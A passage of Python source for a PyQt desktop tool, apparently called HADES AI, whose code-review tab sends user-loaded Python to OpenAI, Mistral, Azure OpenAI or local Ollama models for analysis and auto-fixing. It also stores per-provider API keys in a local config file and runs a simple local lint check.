        right_layout.addWidget(action_group)
        
        # Results/Fixed code
        result_group = QGroupBox("📋 AI Analysis & Fixed Code")
        result_layout = QVBoxLayout(result_group)
        
        self.si_result_display = QPlainTextEdit()
        self.si_result_display.setReadOnly(True)
        self.si_result_display.setFont(QFont("Consolas", 10))
        self.si_result_display.setMinimumHeight(250)
        PythonHighlighter(self.si_result_display.document())
        result_layout.addWidget(self.si_result_display)
        
        # Result actions
        result_actions = QHBoxLayout()
        
        apply_fix_btn = QPushButton("📝 Apply Fix to Editor")
        apply_fix_btn.clicked.connect(self._si_apply_to_editor)
        apply_fix_btn.setStyleSheet("background: #4CAF50;")
        result_actions.addWidget(apply_fix_btn)
        
        save_btn = QPushButton("💾 Save to File")
        save_btn.clicked.connect(self._si_save_fixed_code)
        save_btn.setStyleSheet("background: #0f3460;")
        result_actions.addWidget(save_btn)
        
        diff_btn = QPushButton("📊 Show Diff")
        diff_btn.clicked.connect(self._si_show_diff)
        diff_btn.setStyleSheet("background: #0f3460;")
        result_actions.addWidget(diff_btn)
        
        result_layout.addLayout(result_actions)
        right_layout.addWidget(result_group)
        
        main_splitter.addWidget(right_widget)
        main_splitter.setSizes([500, 500])
        
        layout.addWidget(main_splitter)
        
        return widget
    
    def _si_update_line_count(self):
        """Update line count display"""
        lines = self.si_code_editor.toPlainText().count('\n') + 1
        self.si_line_count.setText(f"Lines: {lines}")
    
    def _si_get_current_provider(self) -> str:
        """Get the currently selected AI provider"""
        if hasattr(self, 'si_provider_combo'):
            idx = self.si_provider_combo.currentIndex()
            if idx == 3:
                return "azure"
            elif idx == 2:
                return "ollama"
            elif idx == 1:
                return "mistral"
        return "openai"
    
    def _si_on_provider_changed(self, index: int):
        """Handle provider selection change"""
        # Show/hide Ollama options
        if hasattr(self, 'si_ollama_layout_widget'):
            self.si_ollama_layout_widget.setVisible(index == 2)
        
        # Show/hide Azure options
        if hasattr(self, 'si_azure_layout_widget'):
            self.si_azure_layout_widget.setVisible(index == 3)
        
        # Show/hide API key input (Ollama doesn't need it)
        if hasattr(self, 'si_api_key_input'):
            needs_key = index != 2  # Ollama doesn't need API key
            self.si_api_key_input.setEnabled(needs_key)
            if index == 2:
                self.si_api_key_input.setPlaceholderText("Not needed for Ollama (runs locally)")
            elif index == 3:
                self.si_api_key_input.setPlaceholderText("Enter your Azure OpenAI API key...")
            else:
                self.si_api_key_input.setPlaceholderText("Enter your API key...")
        
        # Load the API key for the selected provider (without changing the provider selection)
        self._si_load_key_for_provider(index)
        self._si_update_gpt_status()
    
    def _si_load_key_for_provider(self, provider_index: int):
        """Load the saved API key for a specific provider"""
        try:
            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    
                    if provider_index == 3:  # Azure
                        key = config.get("azure_api_key", "")
                        self.si_api_key_input.setText(key)
                        # Load Azure-specific settings
                        if hasattr(self, 'si_azure_endpoint'):
                            self.si_azure_endpoint.setText(config.get("azure_endpoint", ""))
                        if hasattr(self, 'si_azure_deployment'):
                            self.si_azure_deployment.setText(config.get("azure_deployment", ""))
                        if hasattr(self, 'si_azure_api_version'):
                            version = config.get("azure_api_version", "2024-02-15-preview")
                            idx = self.si_azure_api_version.findText(version)
                            if idx >= 0:
                                self.si_azure_api_version.setCurrentIndex(idx)
                            else:
                                self.si_azure_api_version.setCurrentText(version)
                    elif provider_index == 2:  # Ollama
                        self.si_api_key_input.clear()
                    elif provider_index == 1:  # Mistral
                        key = config.get("mistral_api_key", "")
                        self.si_api_key_input.setText(key)
                    else:  # OpenAI
                        key = config.get("openai_api_key", "")
                        self.si_api_key_input.setText(key)
        except:
            pass
    
    def _si_refresh_ollama_models(self):
        """Refresh list of available Ollama models"""
        if not HAS_OLLAMA:
            self.si_result_display.setPlainText("❌ Ollama not installed. Run: pip install ollama\n\nThen install Ollama from https://ollama.ai")
            return
        
        try:
            response = ollama_lib.list()
            model_names = []
            
            # Handle different response formats
            if isinstance(response, dict):
                models = response.get('models', [])
                for m in models:
                    if isinstance(m, dict):
                        # Try different possible keys
                        name = m.get('name') or m.get('model') or str(m)
                        model_names.append(name.split(':')[0] if ':' in name else name)
                    else:
                        model_names.append(str(m))
            elif hasattr(response, 'models'):
                for m in response.models:
                    name = getattr(m, 'name', None) or getattr(m, 'model', str(m))
                    model_names.append(name.split(':')[0] if ':' in str(name) else str(name))
            
            # Remove duplicates
            model_names = list(dict.fromkeys(model_names))
            
            if model_names:
                self.si_ollama_model.clear()
                self.si_ollama_model.addItems(model_names)
                self.si_result_display.setPlainText(f"✅ Found {len(model_names)} Ollama models:\n\n" + "\n".join(model_names))
            else:
                self.si_result_display.setPlainText("⚠️ No models found. Install a model with:\n\nollama pull codellama\nollama pull llama3.2\nollama pull deepseek-coder")
        except Exception as e:
            self.si_result_display.setPlainText(f"❌ Error connecting to Ollama: {str(e)}\n\nMake sure:\n1. Ollama app is installed from https://ollama.ai\n2. Ollama is running (check system tray or run 'ollama serve')")
    
    def _si_toggle_key_visibility(self):
        """Toggle API key visibility"""
        if self.si_api_key_input.echoMode() == QLineEdit.EchoMode.Password:
            self.si_api_key_input.setEchoMode(QLineEdit.EchoMode.Normal)
        else:
            self.si_api_key_input.setEchoMode(QLineEdit.EchoMode.Password)
    
    def _si_get_api_key(self) -> str:
        """Get the current API key from input or environment"""
        key = self.si_api_key_input.text().strip()
        if not key:
            provider = self._si_get_current_provider()
            if provider == "mistral":
                key = os.getenv("MISTRAL_API_KEY", "")
            else:
                key = os.getenv("OPENAI_API_KEY", "")
        return key
    
    def _si_load_saved_config(self):
        """Load saved configuration including API keys and provider (called at startup)"""
        try:
            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    
                    # Load saved provider preference first
                    saved_provider = config.get("ai_provider", "openai")
                    if hasattr(self, 'si_provider_combo'):
                        # Temporarily disconnect to avoid triggering on_changed
                        self.si_provider_combo.blockSignals(True)
                        if saved_provider == "azure":
                            self.si_provider_combo.setCurrentIndex(3)
                        elif saved_provider == "ollama":
                            self.si_provider_combo.setCurrentIndex(2)
                        elif saved_provider == "mistral":
                            self.si_provider_combo.setCurrentIndex(1)
                        else:
                            self.si_provider_combo.setCurrentIndex(0)
                        self.si_provider_combo.blockSignals(False)
                        
                        # Update UI for the loaded provider
                        idx = self.si_provider_combo.currentIndex()
                        if hasattr(self, 'si_ollama_layout_widget'):
                            self.si_ollama_layout_widget.setVisible(idx == 2)
                        if hasattr(self, 'si_azure_layout_widget'):
                            self.si_azure_layout_widget.setVisible(idx == 3)
                        if hasattr(self, 'si_api_key_input'):
                            self.si_api_key_input.setEnabled(idx != 2)
                            if idx == 2:
                                self.si_api_key_input.setPlaceholderText("Not needed for Ollama (runs locally)")
                            elif idx == 3:
                                self.si_api_key_input.setPlaceholderText("Enter your Azure OpenAI API key...")
                            else:
                                self.si_api_key_input.setPlaceholderText("Enter your API key...")
                    
                    # Load the appropriate key based on saved provider
                    if saved_provider == "azure":
                        key = config.get("azure_api_key", "")
                        self.si_api_key_input.setText(key)
                        # Load Azure-specific settings
                        if hasattr(self, 'si_azure_endpoint'):
                            self.si_azure_endpoint.setText(config.get("azure_endpoint", ""))
                        if hasattr(self, 'si_azure_deployment'):
                            self.si_azure_deployment.setText(config.get("azure_deployment", ""))
                        if hasattr(self, 'si_azure_api_version'):
                            version = config.get("azure_api_version", "2024-02-15-preview")
                            self.si_azure_api_version.setCurrentText(version)
                    elif saved_provider == "ollama":
                        self.si_api_key_input.clear()
                    elif saved_provider == "mistral":
                        key = config.get("mistral_api_key", "")
                        self.si_api_key_input.setText(key)
                    else:
                        key = config.get("openai_api_key", "")
                        self.si_api_key_input.setText(key)
        except:
            pass
    
    def _si_save_api_key(self):
        """Save API key to local config file"""
        provider = self._si_get_current_provider()
        key = self.si_api_key_input.text().strip()
        
        # Ollama doesn't need an API key
        if provider == "ollama":
            self._si_save_provider_preference()
            return
        
        if not key:
            self.si_result_display.setPlainText("⚠️ Enter an API key first.")
            return
        
        # Azure needs additional validation
        if provider == "azure":
            endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
            deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
            if not endpoint or not deployment:
                self.si_result_display.setPlainText("⚠️ Azure requires Endpoint URL and Deployment Name.")
                return
        
        try:
            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
            config = {}
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    config = json.load(f)
            
            # Save key for the current provider
            if provider == "azure":
                config["azure_api_key"] = key
                config["azure_endpoint"] = self.si_azure_endpoint.text().strip()
                config["azure_deployment"] = self.si_azure_deployment.text().strip()
                config["azure_api_version"] = self.si_azure_api_version.currentText()
            elif provider == "mistral":
                config["mistral_api_key"] = key
            else:
                config["openai_api_key"] = key
            
            config["ai_provider"] = provider
            
            with open(config_path, 'w') as f:
                json.dump(config, f)
            
            self._si_update_gpt_status()
            provider_names = {"mistral": "Mistral AI", "azure": "Azure OpenAI", "openai": "OpenAI"}
            provider_name = provider_names.get(provider, "OpenAI")
            self.si_result_display.setPlainText(f"✅ {provider_name} configuration saved successfully! You can now use all AI features.")
        except Exception as e:
            self.si_result_display.setPlainText(f"❌ Error saving API key: {str(e)}")
    
    def _si_save_provider_preference(self):
        """Save just the provider preference (for Ollama which doesn't need a key)"""
        provider = self._si_get_current_provider()
        try:
            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
            config = {}
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    config = json.load(f)
            
            config["ai_provider"] = provider
            
            with open(config_path, 'w') as f:
                json.dump(config, f)
            
            self._si_update_gpt_status()
            self.si_result_display.setPlainText(f"✅ Ollama selected as provider. No API key needed!\n\nClick 🔌 Test to verify connection.")
        except Exception as e:
            self.si_result_display.setPlainText(f"❌ Error saving preference: {str(e)}")
    
    def _si_test_api_key(self):
        """Test if the API key / connection works"""
        provider = self._si_get_current_provider()
        
        # Ollama doesn't need API key
        if provider == "ollama":
            self._si_test_ollama()
            return
        
        key = self._si_get_api_key()
        if not key:
            self.si_result_display.setPlainText("⚠️ Enter an API key first.")
            return
        
        self.si_result_display.setPlainText(f"🔄 Testing {provider.upper()} API connection...")
        QApplication.processEvents()
        
        try:
            if provider == "azure":
                if not HAS_AZURE_OPENAI:
                    self.si_result_display.setPlainText("❌ Azure OpenAI not available. Run: pip install openai")
                    return
                
                endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
                deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
                api_version = self.si_azure_api_version.currentText() if hasattr(self, 'si_azure_api_version') else "2024-02-15-preview"
                
                if not endpoint or not deployment:
                    self.si_result_display.setPlainText("⚠️ Enter Azure Endpoint and Deployment Name first.")
                    return
                
                client = AzureOpenAI(
                    api_key=key,
                    api_version=api_version,
                    azure_endpoint=endpoint
                )
                response = client.chat.completions.create(
                    model=deployment,
                    messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}],
                    max_tokens=20,
                    temperature=0
                )
                result = response.choices[0].message.content
                self._si_update_gpt_status()
                self.si_result_display.setPlainText(f"✅ Azure OpenAI Connection Successful!\n\nDeployment: {deployment}\nResponse: {result}\n\nYou can now use all AI features.")
                return
            
            elif provider == "mistral":
                if not HAS_MISTRAL:
                    self.si_result_display.setPlainText("❌ Mistral library not installed. Run: pip install mistralai")
                    return
                
                client = Mistral(api_key=key)
                response = client.chat.complete(
                    model="mistral-small-latest",
                    messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}]
                )
                result = response.choices[0].message.content
            else:
                if not HAS_OPENAI:
                    self.si_result_display.setPlainText("❌ OpenAI library not installed. Run: pip install openai")
                    return
                
                client = OpenAI(api_key=key)
                response = client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}],
                    max_tokens=20,
                    temperature=0
                )
                result = response.choices[0].message.content
            
            self._si_update_gpt_status()
            provider_name = "Mistral AI" if provider == "mistral" else "OpenAI"
            self.si_result_display.setPlainText(f"✅ {provider_name} Connection Successful!\n\nResponse: {result}\n\nYou can now use all AI features.")
        except Exception as e:
            self.si_result_display.setPlainText(f"❌ API Test Failed: {str(e)}\n\nPlease check your API key.")
    
    def _si_test_ollama(self):
        """Test Ollama connection"""
        if not HAS_OLLAMA:
            self.si_result_display.setPlainText("❌ Ollama library not installed.\n\n1. Install Python library: pip install ollama\n2. Install Ollama app from: https://ollama.ai\n3. Run: ollama serve\n4. Pull a model: ollama pull codellama")
            return
        
        model = self.si_ollama_model.currentText() or "llama3.2"
        self.si_result_display.setPlainText(f"🔄 Testing Ollama connection with model '{model}'...")
        QApplication.processEvents()
        
        try:
            # First check if Ollama is running by listing models
            try:
                ollama_lib.list()
            except Exception as conn_err:
                self.si_result_display.setPlainText(f"❌ Cannot connect to Ollama.\n\nMake sure:\n1. Ollama app is installed from https://ollama.ai\n2. Ollama is running (check system tray or run 'ollama serve')\n\nError: {str(conn_err)}")
                return
            
            response = ollama_lib.chat(
                model=model,
                messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}]
            )
            
            # Handle different response formats
            if isinstance(response, dict):
                result = response.get('message', {}).get('content', str(response))
            else:
                result = getattr(getattr(response, 'message', response), 'content', str(response))
            
            self._si_update_gpt_status()
            self.si_result_display.setPlainText(f"✅ Ollama Connection Successful!\n\nModel: {model}\nResponse: {result}\n\nYou can now use all AI features for FREE!")
        except Exception as e:
            error_msg = str(e)
            if "not found" in error_msg.lower() or "pull" in error_msg.lower():
                self.si_result_display.setPlainText(f"❌ Model '{model}' not found.\n\nInstall it with:\n  ollama pull {model}\n\nPopular models:\n  ollama pull llama3.2\n  ollama pull codellama\n  ollama pull mistral\n  ollama pull deepseek-coder:6.7b")
            elif "connection" in error_msg.lower() or "refused" in error_msg.lower():
                self.si_result_display.setPlainText(f"❌ Cannot connect to Ollama.\n\nMake sure Ollama is running:\n1. Check system tray for Ollama icon\n2. Or run: ollama serve\n\nError: {error_msg}")
            else:
                self.si_result_display.setPlainText(f"❌ Ollama Test Failed: {error_msg}\n\nMake sure:\n1. Ollama is installed (https://ollama.ai)\n2. Ollama is running\n3. A model is installed (ollama pull llama3.2)")
    
    def _si_update_gpt_status(self):
        """Update the AI status label"""
        key = self._si_get_api_key()
        provider = self._si_get_current_provider()
        
        if provider == "azure":
            endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
            deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
            if HAS_AZURE_OPENAI and key and endpoint and deployment:
                self.si_gpt_status_label.setText(f"✅ Azure OpenAI Available - Deployment: {deployment}")
                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
            else:
                if not HAS_AZURE_OPENAI:
                    self.si_gpt_status_label.setText("⚠️ Azure OpenAI not available - Run: pip install openai")
                else:
                    self.si_gpt_status_label.setText("⚠️ Enter Azure API key, Endpoint, and Deployment Name")
                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
        elif provider == "ollama":
            if HAS_OLLAMA:
                model = self.si_ollama_model.currentText() if hasattr(self, 'si_ollama_model') else "llama3.2"
                self.si_gpt_status_label.setText(f"✅ Ollama Available (FREE) - Model: {model}")
                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
            else:
                self.si_gpt_status_label.setText("⚠️ Ollama not installed - Run: pip install ollama")
                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
        elif provider == "mistral":
            if HAS_MISTRAL and key:
                self.si_gpt_status_label.setText("✅ Mistral AI Available - Full AI capabilities enabled")
                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
            else:
                if not HAS_MISTRAL:
                    self.si_gpt_status_label.setText("⚠️ Mistral not installed - Run: pip install mistralai")
                else:
                    self.si_gpt_status_label.setText("⚠️ Enter your Mistral API key above to enable AI features")
                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
        else:
            if HAS_OPENAI and key:
                self.si_gpt_status_label.setText("✅ OpenAI GPT Available - Full AI capabilities enabled")
                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
            else:
                if not HAS_OPENAI:
                    self.si_gpt_status_label.setText("⚠️ OpenAI not installed - Run: pip install openai")
                else:
                    self.si_gpt_status_label.setText("⚠️ Enter your OpenAI API key above to enable AI features")
                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
    
    def _si_has_ai(self) -> bool:
        """Check if any AI provider is available with a valid key"""
        provider = self._si_get_current_provider()
        key = self._si_get_api_key()
        if provider == "azure":
            endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
            deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
            return HAS_AZURE_OPENAI and bool(key) and bool(endpoint) and bool(deployment)
        elif provider == "ollama":
            return HAS_OLLAMA  # Ollama doesn't need API key
        elif provider == "mistral":
            return HAS_MISTRAL and bool(key)
        return HAS_OPENAI and bool(key)
    
    def _si_has_gpt(self) -> bool:
        """Check if AI is available (legacy name for compatibility)"""
        return self._si_has_ai()
    
    def _si_get_ai_client(self):
        """Get an AI client instance for the current provider"""
        provider = self._si_get_current_provider()
        key = self._si_get_api_key()
        
        if not key:
            return None
        
        if provider == "mistral":
            if not HAS_MISTRAL:
                return None
            return Mistral(api_key=key)
        else:
            if not HAS_OPENAI:
                return None
            return OpenAI(api_key=key)
    
    def _si_get_openai_client(self):
        """Get an OpenAI client instance (legacy, for compatibility)"""
        return self._si_get_ai_client()
    
    def _si_call_ai(self, system_prompt: str, user_prompt: str, max_tokens: int = 2000, temperature: float = 0.3) -> str:
        """Call the current AI provider with the given prompts"""
        provider = self._si_get_current_provider()
        key = self._si_get_api_key()
        
        try:
            if provider == "ollama":
                if not HAS_OLLAMA:
                    return "❌ Ollama library not installed. Run: pip install ollama\n\nThen install Ollama from https://ollama.ai"
                
                model = self.si_ollama_model.currentText() if hasattr(self, 'si_ollama_model') else "llama3.2"
                response = ollama_lib.chat(
                    model=model,
                    messages=[
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": user_prompt}
                    ]
                )
                
                # Handle different response formats
                if isinstance(response, dict):
                    return response.get('message', {}).get('content', str(response))
                else:
                    return getattr(getattr(response, 'message', response), 'content', str(response))
            elif provider == "azure":
                if not HAS_AZURE_OPENAI:
                    return "❌ Azure OpenAI not available. Run: pip install openai"
                if not key:
                    return "⚠️ No API key configured. Enter your Azure API key above."
                
                endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
                deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
                api_version = self.si_azure_api_version.currentText() if hasattr(self, 'si_azure_api_version') else "2024-02-15-preview"
                
                if not endpoint or not deployment:
                    return "⚠️ Azure requires Endpoint URL and Deployment Name."
                
                client = AzureOpenAI(
                    api_key=key,
                    api_version=api_version,
                    azure_endpoint=endpoint
                )
                response = client.chat.completions.create(
                    model=deployment,
                    messages=[
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": user_prompt}
                    ],
                    max_tokens=max_tokens,
                    temperature=temperature
                )
                return response.choices[0].message.content
            elif provider == "mistral":
                if not HAS_MISTRAL:
                    return "❌ Mistral library not installed. Run: pip install mistralai"
                if not key:
                    return "⚠️ No API key configured. Enter your Mistral API key above."
                
                client = Mistral(api_key=key)
                response = client.chat.complete(
                    model="mistral-small-latest",
                    messages=[
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": user_prompt}
                    ]
                )
                return response.choices[0].message.content
            else:
                if not HAS_OPENAI:
                    return "❌ OpenAI library not installed. Run: pip install openai"
                if not key:
                    return "⚠️ No API key configured. Enter your OpenAI API key above."
                
                client = OpenAI(api_key=key)
                response = client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": user_prompt}
                    ],
                    max_tokens=max_tokens,
                    temperature=temperature
                )
                return response.choices[0].message.content
        except Exception as e:
            return f"❌ AI Error: {str(e)}"
    
    def _si_load_hades_file(self, filename: str):
        """Load a HADES source file"""
        try:
            filepath = os.path.join(os.path.dirname(__file__), filename)
            if not os.path.exists(filepath):
                filepath = filename
            
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
            
            self.si_code_editor.setPlainText(content)
            self.si_file_path.setText(filepath)
            self.si_result_display.setPlainText(f"✅ Loaded {filename} ({len(content)} characters, {content.count(chr(10))+1} lines)")
        except Exception as e:
            self.si_result_display.setPlainText(f"❌ Error loading file: {str(e)}")
    
    def _si_browse_file(self):
        """Browse for a file to load"""
        filepath, _ = QFileDialog.getOpenFileName(self, "Open Code File", "", 
            "Python Files (*.py);;All Files (*.*)")
        if filepath:
            self.si_file_path.setText(filepath)
            self._si_load_custom_file()
    
    def _si_load_custom_file(self):
        """Load a custom file"""
        filepath = self.si_file_path.text().strip()
        if not filepath:
            self.si_result_display.setPlainText("⚠️ Enter a file path first.")
            return
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
            
            self.si_code_editor.setPlainText(content)
            self.si_result_display.setPlainText(f"✅ Loaded {os.path.basename(filepath)} ({len(content)} characters)")
        except Exception as e:
            self.si_result_display.setPlainText(f"❌ Error loading file: {str(e)}")
    
    def _si_analyze_code(self):
        """Analyze code for issues"""
        code = self.si_code_editor.toPlainText().strip()
        if not code:
            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
            return
        
        provider = self._si_get_current_provider()
        provider_name = "Mistral AI" if provider == "mistral" else "OpenAI"
        self.si_result_display.setPlainText(f"🔄 Analyzing code with {provider_name}...")
        QApplication.processEvents()
        
        if self._si_has_ai():
            system_prompt = """You are an expert Python code reviewer. Analyze the code and identify:
1. Bugs and potential errors
2. Security vulnerabilities
3. Performance issues
4. Code style problems
5. Missing error handling
6. Deprecated patterns

For each issue found, explain:
- What the issue is
- Where it is (line number if possible)
- Why it's a problem
- How to fix it

Be thorough but concise."""
            
            result = self._si_call_ai(system_prompt, f"Analyze this code:\n\n```python\n{code[:8000]}\n```")
            
            if result.startswith("❌"):
                self.si_result_display.setPlainText(f"{result}\n\nFalling back to local analysis...")
                self._si_local_analyze(code)
            else:
                self.si_result_display.setPlainText(f"📋 Analysis Results ({provider_name}):\n\n{result}")
        else:
            self._si_local_analyze(code)
    
    def _si_local_analyze(self, code: str):
        """Local code analysis without GPT"""
        issues = []
        lines = code.split('\n')
        
        for i, line in enumerate(lines, 1):
            # Check for common issues
            if 'eval(' in line or 'exec(' in line:
                issues.append(f"Line {i}: ⚠️ Security risk - eval/exec can execute arbitrary code")
            if 'except:' in line and 'Exception' not in line:
                issues.append(f"Line {i}: 🔍 Bare except clause - consider catching specific exceptions")
            if 'TODO' in line or 'FIXME' in line:
                issues.append(f"Line {i}: 📝 TODO/FIXME marker found")
            if 'password' in line.lower() and '=' in line and ('\"' in line or "'" in line):
                issues.append(f"Line {i}: 🔒 Potential hardcoded password")
            if len(line) > 120:
                issues.append(f"Line {i}: 📏 Line too long ({len(line)} chars)")
            if '  ' in line and not line.strip().startswith('#'):
                if line.count('  ') > 2:
                    issues.append(f"Line {i}: 🔧 Consider reducing nesting depth")
        
        # AST analysis
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.FunctionDef):
                    if not ast.get_docstring(node):
                        issues.append(f"Function '{node.name}': 📝 Missing docstring")
                    if len(node.body) > 50:
                        issues.append(f"Function '{node.name}': 📏 Function is very long ({len(node.body)} statements)")
        except SyntaxError as e:
            issues.append(f"❌ Syntax Error: {str(e)}")
        
        if issues:
            result = "📋 Local Analysis Results:\n\n" + "\n".join(issues)
        else:
            result = "✅ No obvious issues found in local analysis.\n\nNote: For deeper analysis, set OPENAI_API_KEY for GPT integration."
        
        self.si_result_display.setPlainText(result)
    
    def _si_auto_fix(self):
        """Automatically fix issues in the code"""
        code = self.si_code_editor.toPlainText().strip()
        if not code:
            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
            return
        
        provider = self._si_get_current_provider()
        provider_name = "Mistral AI" if provider == "mistral" else "OpenAI"
        self.si_result_display.setPlainText(f"🔧 Auto-fixing code with {provider_name}...")
        QApplication.processEvents()
        
        if self._si_has_ai():
            system_prompt = """You are an expert Python developer. Your task is to fix and improve the provided code:
1. Fix any bugs and errors
2. Fix security vulnerabilities  
3. Add proper error handling where missing
4. Fix code style issues
5. Improve performance where obvious
6. Ensure the code is complete and functional

IMPORTANT: Return ONLY the complete fixed code. No explanations, no markdown, just the raw Python code that can be saved directly to a file."""
            
            result = self._si_call_ai(system_prompt, f"Fix and improve this code:\n\n{code[:12000]}", max_tokens=4000, temperature=0.2)
            
            # Extract code from markdown if present
            if '```' in result:
                code_blocks = re.findall(r'```(?:python)?\n?(.*?)```', result, re.DOTALL)
                if code_blocks:
                    result = code_blocks[0].strip()
            
            self.si_result_display.setPlainText(result)
        else:
            self.si_result_display.setPlainText("⚠️ Auto-fix requires AI. Enter your API key above.\n\nOr use the local analysis to identify issues manually.")
    
    def _si_verify_code(self):
        """Verify code for correctness"""
        code = self.si_code_editor.toPlainText().strip()
        if not code:
            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
            return
        
        self.si_result_display.setPlainText("✅ Verifying code...")
        QApplication.processEvents()
        
        results = []
        
        # Syntax check
        try:
            ast.parse(code)
            results.append("✅ Syntax: Valid Python syntax")
        except SyntaxError as e:
            results.append(f"❌ Syntax Error: {str(e)}")
            self.si_result_display.setPlainText("\n".join(results))
            return
        
        # Import check
        import_errors = []
        tree = ast.parse(code)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    try:
                        __import__(alias.name.split('.')[0])
                    except ImportError:
                        import_errors.append(alias.name)
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    try:
                        __import__(node.module.split('.')[0])
                    except ImportError:
                        import_errors.append(node.module)
        
        if import_errors:
            results.append(f"⚠️ Missing imports: {', '.join(set(import_errors))}")
        else:
            results.append("✅ Imports: All imports available")
        
        # Function/class count
        functions = [node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)]
        classes = [node.name for node in ast.walk(tree) if isinstance(node, ast.ClassDef)]
        results.append(f"📊 Structure: {len(functions)} functions, {len(classes)} classes")
        
        # Complexity estimate
        lines = len(code.split('\n'))
        results.append(f"📏 Size: {lines} lines, {len(code)} characters")
        
        if self._si_has_ai():
            provider = self._si_get_current_provider()
            provider_name = "Mistral AI" if provider == "mistral" else "OpenAI"
            ai_result = self._si_call_ai(
                "You are a code reviewer. Briefly verify if this code is correct, well-structured, and follows best practices. Be concise - max 3-4 sentences.",
                f"Verify this code:\n\n```python\n{code[:4000]}\n```",
                max_tokens=300
            )
            if not ai_result.startswith("❌"):
                results.append(f"\n🤖 {provider_name} Verification:\n{ai_result}")
        
        self.si_result_display.setPlainText("\n".join(results))
    
    def _si_apply_action(self, action: str):
        """Apply a specific action to the code"""
        code = self.si_code_editor.toPlainText().strip()
        if not code:
            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
            return
        
        provider = self._si_get_current_provider()
        provider_name = "Mistral AI" if provider == "mistral" else "OpenAI"
        self.si_result_display.setPlainText(f"🔄 Processing with {provider_name}: {action}...")
        QApplication.processEvents()
        
        if self._si_has_ai():
            result = self._si_call_ai(
                f"You are an expert Python developer. {action}. Return ONLY the complete modified code, no explanations or markdown.",
                f"{code[:12000]}",
                max_tokens=4000,
                temperature=0.2
            )
            
            if '```' in result:
                code_blocks = re.findall(r'```(?:python)?\n?(.*?)```', result, re.DOTALL)
                if code_blocks:
                    result = code_blocks[0].strip()
            
            self.si_result_display.setPlainText(result)
        else:
            self.si_result_display.setPlainText("⚠️ This action requires AI. Enter your API key above.")
    
    def _si_apply_custom_instruction(self):
        """Apply custom instruction to the code"""
        instruction = self.si_custom_instruction.text().strip()
        if instruction:
            self._si_apply_action(instruction)
        else:
            self.si_result_display.setPlainText("⚠️ Enter an instruction first.")
    
    def _si_apply_to_editor(self):
        """Apply the fixed code back to the editor"""
        result = self.si_result_display.toPlainText()
        if result and not result.startswith(("⚠️", "❌", "🔄", "📋")):
            # Check if it looks like code
            if 'def ' in result or 'class ' in result or 'import ' in result or '=' in result:
                self.si_code_editor.setPlainText(result)
                self.si_result_display.setPlainText("✅ Fixed code applied to editor. You can now save it to file.")
            else:
                self.si_result_display.setPlainText("⚠️ Result doesn't appear to be code. Run 'Auto-Fix' first to get fixed code.")
        else:
            self.si_result_display.setPlainText("⚠️ No fixed code to apply. Run 'Auto-Fix' first.")
    
    def _si_save_fixed_code(self):
        """Save the fixed code to a file"""
        code = self.si_result_display.toPlainText()
        if not code or code.startswith(("⚠️", "❌", "🔄")):
            # Try using editor content instead
            code = self.si_code_editor.toPlainText()
        
        if not code:
            self.si_result_display.setPlainText("⚠️ No code to save.")
            return
        
        filepath = self.si_file_path.text().strip()
        if filepath:
            # Suggest backup name
            backup_path = filepath.replace('.py', '_fixed.py')
            filepath, _ = QFileDialog.getSaveFileName(self, "Save Fixed Code", backup_path,
                "Python Files (*.py);;All Files (*.*)")
        else:
            filepath, _ = QFileDialog.getSaveFileName(self, "Save Fixed Code", "",
                "Python Files (*.py);;All Files (*.*)")
        
        if filepath:
            try:
